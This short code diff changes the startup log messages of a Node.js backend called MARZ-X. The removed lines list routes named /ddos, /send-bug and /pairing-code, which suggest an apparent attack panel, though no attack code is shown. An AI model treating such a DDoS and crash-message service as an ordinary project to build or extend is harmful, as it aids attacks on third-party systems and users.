-    console.log(`[ROUTES] /status, /pairing-code, /send-bug, /ddos, /tools/*, /users, /add-user, /edit-user, /delete-user`);
-    console.log(`[ADMIN] Hanya master yang bisa manage user`);
+  console.log(`[SERVER] MARZ-X Backend running on port ${PORT}`);
+  console.log(`[NODE] ${process.version}`);
+  console.log(`[AUTH] JWT + bcrypt active`);
 });
